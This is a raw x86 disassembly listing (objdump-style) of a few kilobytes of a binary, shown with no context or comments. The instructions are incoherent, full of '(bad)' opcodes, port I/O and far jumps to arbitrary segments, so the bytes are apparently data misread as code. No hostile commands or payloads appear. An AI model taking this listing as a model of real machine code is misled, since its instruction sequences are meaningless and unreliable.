  41d54c:	add    dh,bl
  41d54e:	daa    
  41d54f:	imul   ebx,eax,0x9
  41d552:	jp     0x41d53d
  41d554:	cmp    dh,BYTE PTR [ecx+eiz*2]
  41d557:	sub    eax,0xf2829776
  41d55c:	add    eax,0x1434dd0c
  41d561:	push   ss
  41d562:	call   0xdf6:0xeb450ae0
  41d569:	mov    al,ds:0x71837d46
  41d56e:	mov    edi,0x13d8d278
  41d573:	popa   
  41d574:	aaa    
  41d575:	jo     0x41d557
  41d577:	fdivr  DWORD PTR [edi-0x58]
  41d57a:	add    edi,DWORD PTR [edx+0x4c40d19f]
  41d580:	pop    ds
  41d581:	mov    eax,ds:0x3971c148
  41d586:	mov    ds:0xb1e672b2,al
  41d58b:	fadd   DWORD PTR [esi+0x10179b96]
  41d591:	xor    ecx,esi
  41d593:	out    dx,eax
  41d594:	sub    ecx,esp
  41d596:	leave  
  41d597:	in     eax,0x95
  41d599:	xor    eax,0x4f08869d
  41d59e:	xor    eax,0xaf7e474
  41d5a3:	or     BYTE PTR [ebp-0x25],dl
  41d5a6:	push   ds
  41d5a7:	xor    edx,DWORD PTR [esi]
  41d5a9:	dec    edi
  41d5aa:	scas   al,BYTE PTR es:[edi]
  41d5ab:	jne    0x41d569
  41d5ad:	sub    ah,BYTE PTR [edi-0x762a6afc]
  41d5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b4:	or     esp,ebp
  41d5b6:	cmp    eax,0xc1f79719
  41d5bb:	retf   
  41d5bc:	stc    
  41d5bd:	pop    edx
  41d5be:	or     al,0xb1
  41d5c0:	mov    ebp,0xa40b7ae5
  41d5c5:	push   ebp
  41d5c6:	int3   
  41d5c7:	es jmp 0x80d:0x408b6517
  41d5cf:	jge    0x41d59a
  41d5d1:	scas   al,BYTE PTR es:[edi]
  41d5d2:	out    0x67,eax
  41d5d4:	mov    BYTE PTR [ebp+0x4e],ch
  41d5d7:	ds adc al,0x54
  41d5da:	stos   DWORD PTR es:[edi],eax
  41d5db:	xchg   bp,ax
  41d5dd:	idiv   DWORD PTR [ebp-0x43]
  41d5e0:	imul   ebx,DWORD PTR [edi],0xffffffaa
  41d5e3:	into   
  41d5e4:	or     bl,BYTE PTR [ecx]
  41d5e6:	shr    DWORD PTR [eax],1
  41d5e8:	or     eax,0x50e53246
  41d5ed:	outs   dx,DWORD PTR ds:[esi]
  41d5ee:	sar    DWORD PTR [ebx+0x5c],cl
  41d5f1:	psrlq  mm3,QWORD PTR [edx+eiz*1]
  41d5f5:	mov    dl,0x86
  41d5f7:	or     DWORD PTR [edi],esp
  41d5f9:	jge    0x41d5ce
  41d5fb:	mov    bl,0x36
  41d5fd:	dec    ecx
  41d5fe:	mov    ds:0xdbc1231d,al
  41d603:	pop    eax
  41d604:	fwait
  41d605:	loopne 0x41d599
  41d607:	(bad)  
  41d608:	out    dx,al
  41d609:	jns    0x41d675
  41d60b:	lahf   
  41d60c:	jb     0x41d679
  41d60e:	sbb    DWORD PTR [ebx+0x77],ebp
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xf666e435
  41d681:	iret   
  41d682:	(bad)  
  41d683:	(bad)  
  41d684:	aad    0x38
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0x68000001
  41d68d:	aas    
  41d68e:	jl     0x41d673
  41d690:	sbb    eax,0x2d03d2b3
  41d695:	adc    al,0xb2
  41d697:	cld    
  41d698:	push   edx
  41d699:	or     eax,0x810bad01
  41d69e:	mov    edx,0xe364d8d
  41d6a3:	shl    DWORD PTR [ebx],cl
  41d6a5:	mov    WORD PTR [eax+0x3c976e01],ss
  41d6ab:	jmp    0x75ef:0x25196378
  41d6b2:	dec    ecx
  41d6b3:	mov    edi,0x2622665b
  41d6b8:	and    edx,DWORD PTR [esp+eiz*2-0x3e5cdd7b]
  41d6bf:	out    0xf4,al
  41d6c1:	xlat   BYTE PTR ds:[ebx]
  41d6c3:	and    BYTE PTR [edi],dh
  41d6c5:	push   ds
  41d6c6:	fwait
  41d6c7:	adc    al,0x38
  41d6c9:	lods   al,BYTE PTR ds:[esi]
  41d6ca:	call   0x4a1fd5ad
  41d6cf:	dec    ecx
  41d6d0:	mov    DWORD PTR [ebp-0x2b],0xc31feddb
  41d6d7:	mov    bh,0x42
  41d6d9:	in     eax,0xce
  41d6db:	sahf   
  41d6dc:	sti    
  41d6dd:	addr16 push es
  41d6df:	or     al,0xbe
  41d6e1:	dec    edx
  41d6e2:	sbb    BYTE PTR [edx],bh
  41d6e4:	mov    al,0x5c
  41d6e6:	pusha  
  41d6e7:	out    0x4e,eax
  41d6e9:	clc    
  41d6ea:	pop    edx
  41d6eb:	mov    ah,0x60
  41d6ed:	mov    eax,DWORD PTR [edi]
  41d6ef:	in     al,dx
  41d6f0:	adc    DWORD PTR [eax+edi*8],esp
  41d6f3:	or     al,0x9c
  41d6f5:	clc    
  41d6f6:	mov    esi,0x5ba4d004
  41d6fb:	mov    bl,dl
  41d6fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6fe:	out    0xb0,al
  41d700:	dec    edi
  41d701:	push   esp
  41d702:	fistp  DWORD PTR [esi+0x759d339f]
  41d708:	(bad)  
  41d70a:	xor    ecx,esp
  41d70c:	pop    ecx
  41d70d:	inc    esi
  41d70e:	adc    al,0xa2
  41d710:	push   edx
  41d711:	mov    esp,DWORD PTR ds:0x2bbbc708
  41d717:	in     eax,0x1d
  41d719:	inc    ebp
  41d71a:	xor    edx,DWORD PTR [ebx+ebp*8+0x3bd73cfd]
  41d721:	stos   DWORD PTR es:[edi],eax
  41d722:	jl     0x41d77f
  41d724:	lods   eax,DWORD PTR ds:[esi]
  41d725:	ja     0x41d6c1
  41d727:	adc    DWORD PTR [edi-0x48],ecx
  41d72a:	jge    0x41d6af
  41d72c:	mov    al,ds:0x8032cb4a
  41d731:	cld    
  41d732:	nop
  41d733:	dec    esi
  41d734:	inc    ebp
  41d735:	sahf   
  41d736:	retf   
  41d737:	fstp   QWORD PTR [edi+0x2a]
  41d73a:	neg    ecx
  41d73c:	jg     0x41d747
  41d73e:	ss cwde 
  41d740:	daa    
  41d741:	or     esi,edx
  41d743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d744:	mov    ecx,0x176efb07
  41d749:	arpl   WORD PTR [ecx+0x47],di
  41d74c:	or     al,0x60
  41d74e:	jmp    0x803b:0x9cae9c7e
  41d755:	jmp    0x172f:0x83daa353
  41d75c:	jne    0x41d776
  41d75e:	rcl    BYTE PTR [esi+0x0],1
  41d761:	jno    0x41d6e5
  41d763:	and    BYTE PTR [esi+0x25224e6],ch
  41d769:	dec    ebx
  41d76a:	loopne 0x41d77d
  41d76c:	inc    edi
  41d76d:	sub    DWORD PTR [ecx-0x6],ecx
  41d770:	xor    BYTE PTR [ecx-0x64],bl
  41d773:	jb     0x41d6f5
  41d775:	sub    eax,0x472bf9e3
  41d77a:	pop    edx
  41d77b:	adc    dl,bh
  41d77d:	and    dl,ch
  41d77f:	mov    ebp,0xeccb3847
  41d784:	clc    
  41d785:	repnz fsub DWORD PTR [esi+0x75]
  41d789:	add    al,0x12
  41d78b:	or     BYTE PTR [esi+edi*8+0xab523d],dh
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	sub    BYTE PTR [edx],ah
  41d802:	in     al,dx
  41d803:	sub    al,0xda
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0x78000001,al
  41d80d:	jbe    0x41d7c8
  41d80f:	dec    eax
  41d810:	mov    ds:0x18b797bc,eax
  41d815:	or     bh,al
  41d817:	das    
  41d818:	mov    dh,0x3
  41d81a:	clc    
  41d81b:	push   cs
  41d81c:	sbb    BYTE PTR [eax-0xd],bh
  41d81f:	and    eax,ebp
  41d821:	imul   esp,DWORD PTR ds:0x59f1a142,0x2c055506
  41d82b:	mov    cl,0xe4
  41d82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d82e:	cwde   
  41d82f:	cmp    DWORD PTR [esi+ebx*4-0x6242b7a3],eax
  41d836:	and    BYTE PTR [edx+0x65],0x55
  41d83a:	(bad)  
  41d83b:	mov    al,0x99
  41d83d:	mov    BYTE PTR [ebx+0x5f],ah
  41d840:	int3   
  41d841:	sub    DWORD PTR [edx+0x13],esp
  41d844:	dec    edi
  41d845:	sub    al,0xe0
  41d847:	mov    al,0x64
  41d849:	pop    ecx
  41d84a:	inc    eax
  41d84b:	ds cmc 
  41d84d:	pop    eax
  41d84e:	xor    ch,BYTE PTR [esi-0x68846d1a]
  41d854:	fistp  QWORD PTR [ebx-0x215cae58]
  41d85a:	mov    al,0x66
  41d85c:	dec    eax
  41d85d:	adc    eax,DWORD PTR [ebx]
  41d85f:	xor    esp,esi
  41d861:	cmp    ebx,DWORD PTR [edx+0x631b2a96]
  41d867:	(bad)  [edi-0x4c328943]
  41d86d:	jp     0x41d86b
  41d86f:	dec    esi
  41d870:	cmp    al,0xa2
  41d872:	(bad)  
  41d873:	mov    ds:0x8db2fa0a,eax
  41d878:	in     eax,0x5b
  41d87a:	enter  0x7a89,0x9d
  41d87e:	xor    al,0x73
  41d880:	mov    dh,0x91
  41d882:	sar    DWORD PTR [edx+0x132b5695],1
  41d888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d889:	mov    edx,0xe74a6f2b
  41d88e:	dec    esp
  41d88f:	jp     0x41d81b
  41d891:	cmp    ecx,ebx
  41d893:	test   BYTE PTR [edi-0x5c1e17b1],dh
  41d899:	imul   edx,ebp,0x7c494c81
  41d89f:	mov    cl,0x94
  41d8a1:	sar    DWORD PTR [edi+ebp*8],1
  41d8a4:	mov    eax,0xad5a4965
  41d8a9:	dec    ecx
  41d8aa:	mov    ecx,0x67126bfe
  41d8b0:	cmp    BYTE PTR [ecx+eax*8+0x2],ch
  41d8b4:	aaa    
  41d8b5:	fild   QWORD PTR [ebx+0x51]
  41d8b8:	or     al,0xab
  41d8ba:	shl    DWORD PTR [ecx],1
  41d8bc:	dec    ebx
  41d8bd:	popa   
  41d8be:	pop    esi
  41d8bf:	sbb    eax,0x48c03de6
  41d8c4:	shl    BYTE PTR [eax+ecx*8-0x43],0x99
  41d8c9:	mov    ebx,0xcc7d5085
  41d8ce:	jmp    0xedb63b5c
  41d8d3:	or     BYTE PTR [ecx+0x57],ch
  41d8d6:	(bad)  [edx+0xe55c960]
  41d8dc:	lods   eax,DWORD PTR ds:[esi]
  41d8dd:	std    
  41d8de:	imul   esi,DWORD PTR [edi+0x17],0x4da77323
  41d8e5:	out    dx,al
  41d8e6:	inc    ebp
  41d8e7:	jge    0x41d927
  41d8e9:	stc    
  41d8ea:	pop    edx
  41d8eb:	shr    eax,0x3f
  41d8ee:	cld    
  41d8ef:	arpl   WORD PTR [eax],si
  41d8f1:	ret    0x7e0c
  41d8f4:	dec    esi
  41d8f5:	in     eax,0x7a
  41d8f7:	sbb    eax,0xc1d38b0b
  41d8fc:	jle    0x41d882
  41d8fe:	popf   
  41d8ff:	xor    al,0xe3
  41d901:	jmp    0x24e2:0x874dbdc8
  41d908:	push   edi
  41d909:	gs jg  0x41d979
  41d90c:	rcr    DWORD PTR [eax],0x8e
  41d90f:	(bad)  
  41d910:	inc    BYTE PTR [eax]
	...
  41d972:	add    BYTE PTR [eax],al
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs enter 0x3e28,0x74
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x14000001
  41d98d:	out    0xd0,eax
  41d98f:	push   edx
  41d990:	mov    DWORD PTR [ebp-0x45],edx
  41d993:	aam    0x1c
  41d995:	xor    al,0x30
  41d997:	lods   al,BYTE PTR ds:[esi]
  41d998:	(bad)  
  41d999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99a:	(bad)  
  41d99b:	in     eax,dx
  41d99c:	cld    
  41d99d:	xor    BYTE PTR [edx+esi*8-0x1c],0xc5
  41d9a2:	popa   
  41d9a3:	inc    edi
  41d9a4:	bound  edx,QWORD PTR [edi-0x79]
  41d9a7:	mov    BYTE PTR [ecx-0x6b88fee5],ch
  41d9ad:	xchg   ebp,eax
  41d9ae:	lahf   
  41d9af:	push   0xc434bd2d
  41d9b4:	les    edi,FWORD PTR [ebx+ebx*2]
  41d9b7:	ror    BYTE PTR [eax+0x55],cl
  41d9ba:	mov    ds:0x580b1471,eax
  41d9bf:	aaa    
  41d9c0:	jnp    0x41d9ba
  41d9c2:	retf   
  41d9c3:	fldln2 
  41d9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9c6:	sbb    edx,DWORD PTR ds:0x85208f0
  41d9cc:	jmp    0x892c01ef
  41d9d1:	sub    al,0xa
  41d9d3:	cwde   
  41d9d4:	xchg   BYTE PTR [esi-0x62],ch
  41d9d7:	sbb    ebx,DWORD PTR [ebx+0x20]
  41d9da:	cwde   
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fisttp QWORD PTR [esi-0x3e75219b]
  41d9e2:	lods   eax,DWORD PTR ds:[esi]
  41d9e3:	outs   dx,BYTE PTR ds:[esi]
  41d9e4:	push   esp
  41d9e5:	cmp    eax,0x6f472481
  41d9ea:	jo     0x41da15
  41d9ec:	push   es
  41d9ed:	pop    edx
  41d9ee:	dec    edx
  41d9ef:	into   
  41d9f0:	xchg   BYTE PTR [ecx-0x73fd6b9f],bh
  41d9f6:	out    dx,al
  41d9f7:	push   ds
  41d9f8:	push   esi
  41d9f9:	or     al,0x76
  41d9fb:	mov    cl,0xe5
  41d9fd:	mov    esp,0x4a1f05c6
  41da02:	xchg   ecx,eax
  41da03:	daa    
  41da04:	stos   DWORD PTR es:[edi],eax
  41da05:	adc    al,0x2c
  41da07:	xchg   ecx,eax
  41da08:	rol    BYTE PTR [ebx-0x45c6d5ec],1
  41da0e:	dec    eax
  41da0f:	fimul  WORD PTR [ebx-0x77]
  41da12:	mov    edi,0xfd7bfde0
  41da17:	sbb    al,0x80
  41da19:	jno    0x41d9d1
  41da1b:	sbb    ecx,ebx
  41da1d:	cwde   
  41da1e:	jne    0x41da0f
  41da20:	inc    ecx
  41da21:	adc    edi,DWORD PTR ds:0xf05dd532
  41da27:	bound  edx,QWORD PTR ds:0x898e2a33
  41da2d:	rcl    ch,1
  41da2f:	mov    ah,0x9a
  41da31:	mov    ?,WORD PTR [ebx+0x7efbd11a]
  41da37:	(bad)  
  41da38:	sbb    al,bl
  41da3a:	mov    dh,0xdc
  41da3c:	mov    ecx,0x8a2ab8b
  41da41:	nop
  41da42:	push   ebp
  41da43:	out    dx,al
  41da44:	dec    edx
  41da45:	pop    edx
  41da46:	into   
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	fisub  DWORD PTR [ebx+0xd]
  41da4b:	xchg   al,ch
  41da4d:	sahf   
  41da4e:	mov    ebx,0x11334603
  41da53:	test   al,0x85
  41da55:	sbb    ebp,esi
  41da57:	or     edx,DWORD PTR [edx-0x37]
  41da5a:	bound  ebp,QWORD PTR ds:0xf3ce1736
  41da60:	shl    DWORD PTR [edx],1
  41da62:	mov    edi,0xd9077e65
  41da67:	test   al,0x9
  41da69:	inc    esp
  41da6a:	in     al,dx
  41da6b:	test   eax,edx
  41da6d:	lods   al,BYTE PTR ds:[esi]
  41da6e:	ret    
  41da6f:	pop    edx
  41da70:	(bad)  
  41da71:	adc    BYTE PTR [eax+0x5b],cl
  41da74:	inc    edi
  41da75:	std    
  41da76:	and    ebp,esp
  41da78:	mov    DWORD PTR [edi+edi*2+0x6d9f6679],edx
  41da7f:	mov    WORD PTR [ecx-0x12],fs
  41da82:	mov    al,ds:0x3968b70e
  41da87:	clc    
  41da88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da89:	adc    al,0x65
  41da8b:	xchg   esi,eax
  41da8c:	mov    ecx,0x1025019a
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x1d
  41db01:	jle    0x41db7e
  41db03:	and    ah,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xee000001
  41db0d:	jne    0x41db42
  41db0f:	in     eax,0xda
  41db11:	adc    DWORD PTR [ebp-0x4d4ac62c],esi
  41db17:	dec    ebp
  41db18:	push   esp
  41db19:	push   0xa93dae12
  41db1e:	in     eax,0xfe
  41db20:	mov    dl,0x1f
  41db22:	enter  0xb74c,0xc3
  41db26:	push   cs
  41db27:	retf   
  41db28:	scas   al,BYTE PTR es:[edi]
  41db29:	push   esp
  41db2a:	(bad)  
  41db2b:	cs icebp 
  41db2d:	adc    DWORD PTR [edi+0x678ee7a7],0xd2e048cd
  41db37:	inc    esp
  41db38:	dec    esi
  41db39:	xchg   DWORD PTR [edx],eax
  41db3b:	test   ah,0xe2
  41db3e:	imul   edi,DWORD PTR [ebx+0x4f],0xb1bd237a
  41db45:	sbb    BYTE PTR [esi],bl
  41db47:	mov    eax,ds:0x8fab54b3
  41db4c:	jmp    0x41dbb9
  41db4e:	fstp   DWORD PTR [eax+0x58]
  41db51:	imul   eax,esi,0xd93936e3
  41db57:	mov    eax,DWORD PTR [ebp-0x29d98070]
  41db5d:	cmp    al,0x34
  41db5f:	nop
  41db60:	xor    al,0xae
  41db62:	cmp    esp,DWORD PTR [ebx+0x6c]
  41db65:	sbb    BYTE PTR [eax],bl
  41db67:	hlt    
  41db68:	(bad)  
  41db69:	rcl    BYTE PTR [edx],1
  41db6b:	leave  
  41db6c:	outs   dx,DWORD PTR ds:[esi]
  41db6d:	aam    0x73
  41db6f:	jae    0x41db51
  41db71:	addr16 mov edx,0x2f2c8bdb
  41db77:	and    al,0x8e
  41db79:	jno    0x41dbae
  41db7b:	(bad)  
  41db7c:	(bad)  
  41db7d:	xor    al,0x83
  41db7f:	or     edi,DWORD PTR [esi-0x40]
  41db82:	(bad)  
  41db83:	aad    0xa
  41db85:	jae    0x41db40
  41db87:	mov    dh,0xe4
  41db89:	xlat   BYTE PTR ds:[ebx]
  41db8a:	aad    0xc6
  41db8c:	aas    
  41db8d:	(bad)  
  41db8f:	into   
  41db90:	in     eax,dx
  41db91:	les    esp,FWORD PTR [eax]
  41db93:	loopne 0x41dbcb
  41db95:	repnz fs dec edi
  41db98:	adc    dh,BYTE PTR [ecx+0x52]
  41db9b:	adc    al,cl
  41db9d:	call   0x6a1a:0xd309a55e
  41dba4:	fs retf 
  41dba6:	pop    ds
  41dba7:	sub    edi,DWORD PTR [ebx-0x100220a9]
  41dbad:	adc    DWORD PTR [esi-0x3],ebp
  41dbb0:	pop    ss
  41dbb1:	cmp    DWORD PTR [ecx+0x1285c92],0x4a
  41dbb8:	sub    DWORD PTR [ebp-0x33112e3d],ebp
  41dbbe:	jmp    0x41db6a
  41dbc0:	lock fstp TBYTE PTR [esi-0x2cf28429]
  41dbc7:	(bad)  
  41dbc8:	fcmove st,st(5)
  41dbca:	or     eax,DWORD PTR [eax-0xcd72842]
  41dbd0:	jns    0x41dbdb
  41dbd2:	fbstp  TBYTE PTR [esi]
  41dbd4:	pop    DWORD PTR [edx]
  41dbd6:	into   
  41dbd7:	mov    ch,0x50
  41dbd9:	push   eax
  41dbda:	lock push esi
  41dbdc:	or     dh,ah
  41dbde:	adc    BYTE PTR [esi],ah
  41dbe0:	ss (bad) 
  41dbe2:	addr16 es (bad) 
  41dbe5:	xchg   esp,eax
  41dbe6:	inc    eax
  41dbe7:	or     eax,0xa6d5b2ab
  41dbec:	and    al,0x90
  41dbee:	mov    eax,0x4a3175b1
  41dbf3:	sbb    DWORD PTR [esi],edx
  41dbf5:	adc    ah,BYTE PTR [esi+0x77e4b687]
  41dbfb:	repnz push ss
  41dbfd:	add    ah,bl
  41dbff:	stos   DWORD PTR es:[edi],eax
  41dc00:	call   0x8c61:0x3102e067
  41dc07:	xchg   edx,eax
  41dc08:	jmp    0xea97:0xcf69cc20
  41dc0f:	push   esi
  41dc10:	lahf   
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi-0x404f2fb0]
  41dc81:	pop    ds
  41dc82:	add    eax,DWORD PTR [ecx+ebp*8+0x500013c]
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    cl,cl
  41dc8d:	lea    edi,[ebx+0x62]
  41dc90:	call   0x756c:0xdc627c66
  41dc97:	pop    es
  41dc98:	cmp    eax,0xd84af1d8
  41dc9d:	jbe    0x41dd18
  41dc9f:	or     eax,0xd08113e2
  41dca4:	je     0x41dcd7
  41dca6:	aad    0x90
  41dca8:	dec    ebx
  41dca9:	or     edx,DWORD PTR [esi]
  41dcab:	inc    ebx
  41dcac:	jne    0x41dcaf
  41dcae:	dec    esp
  41dcaf:	dec    ebx
  41dcb0:	xor    esp,eax
  41dcb2:	clc    
  41dcb3:	cs pop ss
  41dcb5:	hlt    
  41dcb6:	pushw  ss
  41dcb8:	push   ebx
  41dcb9:	inc    esi
  41dcba:	outs   dx,DWORD PTR ds:[esi]
  41dcbb:	xor    dl,al
  41dcbd:	clc    
  41dcbe:	jmp    0x3a0b:0xc4cc5bca
  41dcc5:	scas   al,BYTE PTR es:[edi]
  41dcc6:	xchg   esi,eax
  41dcc7:	ins    BYTE PTR es:[edi],dx
  41dcc8:	and    DWORD PTR [esi+0x1f],eax
  41dccb:	imul   edx,DWORD PTR [edi+eiz*2+0x213b3f78],0xa3e5f668
  41dcd6:	(bad)  
  41dcd7:	mov    ebp,0xac57b5ff
  41dcdc:	fidiv  DWORD PTR ss:[edi-0x7f53a909]
  41dce3:	jae    0x41dc99
  41dce5:	es and eax,0x1272e195
  41dceb:	(bad)  
  41dcec:	fisub  DWORD PTR [edi]
  41dcee:	cwde   
  41dcef:	scas   al,BYTE PTR es:[edi]
  41dcf0:	out    dx,al
  41dcf1:	aad    0x70
  41dcf3:	dec    ecx
  41dcf4:	jge    0x41dcac
  41dcf6:	add    eax,0x46e6befd
  41dcfb:	js     0x41dd31
  41dcfd:	test   edi,ebx
  41dcff:	stos   BYTE PTR es:[edi],al
  41dd00:	push   0x7a89b563
  41dd05:	pop    es
  41dd06:	pop    esi
  41dd07:	test   al,0xac
  41dd09:	es (bad) 
  41dd0b:	(bad)  
  41dd0c:	fsubr  DWORD PTR [eax]
  41dd0e:	out    0x75,al
  41dd10:	pusha  
  41dd11:	in     eax,dx
  41dd12:	mov    BYTE PTR [esi-0x60ad721e],bl
  41dd18:	test   BYTE PTR [ecx-0x73],0x20
  41dd1c:	stos   DWORD PTR es:[edi],eax
  41dd1d:	mov    ch,0x30
  41dd1f:	dec    edx
  41dd20:	imul   ebx,DWORD PTR [eax-0x6275f60c],0xffffffd5
  41dd27:	mov    dh,0x3c
  41dd29:	push   eax
  41dd2a:	xchg   ebp,eax
  41dd2c:	das    
  41dd2d:	xlat   BYTE PTR ds:[ebx]
  41dd2e:	xor    al,0xd4
  41dd30:	mov    edx,0x8e64ec03
  41dd35:	and    ebp,DWORD PTR [ebx+0x5d]
  41dd38:	call   0xa0308d13
  41dd3d:	repnz pop ecx
  41dd3f:	lock cmp BYTE PTR [ebx],al
  41dd42:	sub    al,0x1d
  41dd44:	les    ecx,FWORD PTR [edi+0x27a158f0]
  41dd4a:	push   ds
  41dd4b:	das    
  41dd4c:	aad    0x3c
  41dd4e:	imul   edi,DWORD PTR [ecx+0x7e9de044],0xc2993889
  41dd58:	adc    BYTE PTR ds:0x4dc61d3,ch
  41dd5e:	add    eax,0x7f45d498
  41dd63:	imul   edi
  41dd65:	or     al,0x29
  41dd67:	pop    edx
  41dd68:	das    
  41dd69:	sbb    DWORD PTR [esi],edi
  41dd6b:	or     eax,0xaf7ed25b
  41dd70:	js     0x41dcf5
  41dd72:	idiv   DWORD PTR [ebp+0x179a77ea]
  41dd78:	fisttp WORD PTR [edx-0x68e20c3f]
  41dd7e:	xor    DWORD PTR [ecx+0x50],eax
  41dd81:	dec    esp
  41dd82:	cwde   
  41dd83:	dec    ebp
  41dd84:	lods   eax,DWORD PTR ds:[esi]
  41dd85:	dec    esi
  41dd86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd87:	lods   al,BYTE PTR ds:[esi]
  41dd88:	aad    0x40
  41dd8a:	icebp  
  41dd8b:	mov    esi,0x1ec68eef
  41dd90:	aam    0x0
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	push   ebp
  41de01:	pushf  
  41de02:	sub    ebp,edx
  41de04:	out    dx,al
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	sbb    edx,DWORD PTR [ebx+ebx*1+0x52]
  41de10:	cs neg ch
  41de13:	push   es
  41de14:	jmp    FWORD PTR ds:0x178537da
  41de1a:	mov    ch,BYTE PTR [edi+edx*2-0x5ec78e50]
  41de21:	dec    edi
  41de22:	neg    BYTE PTR [edi+0x31]
  41de25:	stos   BYTE PTR es:[edi],al
  41de26:	push   ecx
  41de27:	sub    eax,0xce279f56
  41de2c:	cli    
  41de2d:	stc    
  41de2e:	jl     0x41dde9
  41de30:	retf   
  41de31:	fisubr DWORD PTR [edx]
  41de33:	xchg   esp,eax
  41de34:	inc    ebp
  41de35:	neg    ecx
  41de37:	sub    eax,0x6e61688c
  41de3c:	fwait
  41de3d:	and    esi,DWORD PTR [ebp-0x69]
  41de40:	add    DWORD PTR [ebx],0xbcb1b20a
  41de46:	inc    ebx
  41de47:	out    0x21,al
  41de49:	stos   BYTE PTR es:[edi],al
  41de4a:	dec    ebp
  41de4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de4c:	add    eax,0xb487af17
  41de51:	and    al,BYTE PTR [ebp+0x627b248]
  41de57:	adc    DWORD PTR [ebp+0x44],ebp
  41de5a:	pop    edx
  41de5b:	sub    BYTE PTR [ecx],ch
  41de5d:	mov    eax,ds:0xf2167de6
  41de62:	test   ah,0xa1
  41de65:	xchg   edi,eax
  41de66:	cli    
  41de67:	pop    es
  41de68:	mov    esi,0x9d712f60
  41de6d:	mov    al,0xcd
  41de6f:	imul   esp,DWORD PTR [ebx],0xffffffb6
  41de72:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de74:	dec    ecx
  41de75:	push   es
  41de76:	iret   
  41de77:	call   0xbbfcb36
  41de7c:	and    al,BYTE PTR [eax-0x80]
  41de7f:	sbb    ebx,0x3c181fd
  41de85:	jl     0x41de22
  41de87:	push   esi
  41de88:	xchg   esi,eax
  41de89:	adc    edi,eax
  41de8b:	or     al,0xb8
  41de8d:	pushf  
  41de8e:	stos   DWORD PTR es:[edi],eax
  41de8f:	mov    al,0xe0
  41de91:	or     al,0xf7
  41de93:	inc    edx
  41de94:	shl    DWORD PTR [ebp+0x19d52306],1
  41de9a:	loopne 0x41de22
  41de9c:	or     dh,0x1b
  41de9f:	imul   edi,DWORD PTR [edi-0x38ad8f03],0x19
  41dea6:	push   ebp
  41dea7:	cmp    al,BYTE PTR [ebp+0x4ca2bc43]
  41dead:	xchg   esp,eax
  41deae:	popa   
  41deaf:	std    
  41deb0:	mov    ecx,DWORD PTR [edx+0x61]
  41deb3:	out    dx,al
  41deb4:	cmp    eax,0xfd2dc394
  41deb9:	test   al,ch
  41debb:	pop    ebx
  41debc:	adc    al,BYTE PTR [ebx+0xe]
  41debf:	out    dx,eax
  41dec0:	into   
  41dec1:	inc    eax
  41dec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dec3:	xchg   edx,eax
  41dec4:	or     DWORD PTR ds:0x78847d3,eax
  41deca:	or     DWORD PTR [ebx],0x5d
  41decd:	sahf   
  41dece:	mov    ebx,0xe03cf1fd
  41ded3:	in     eax,dx
  41ded4:	cmp    dh,BYTE PTR [eax+0x3a]
  41ded7:	bound  edi,QWORD PTR [esi+0x794e5e68]
  41dedd:	push   0xcf71245
  41dee2:	ja     0x41de77
  41dee4:	sar    DWORD PTR [edx],1
  41dee6:	mov    ds:0xdc964703,eax
  41deeb:	jmp    0xc38f:0x114f00db
  41def2:	jmp    0x41def8
  41def4:	js     0x41dede
  41def6:	xor    DWORD PTR [eax+0x674ae532],ebp
  41defc:	sbb    esp,DWORD PTR [esi+0x70aec10f]
  41df02:	push   ebx
  41df03:	mov    ds:0xff4560a2,eax
  41df08:	(bad)  
  41df09:	sub    edx,DWORD PTR [edi]
  41df0b:	or     edi,DWORD PTR es:[edx+0xdf2827]
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
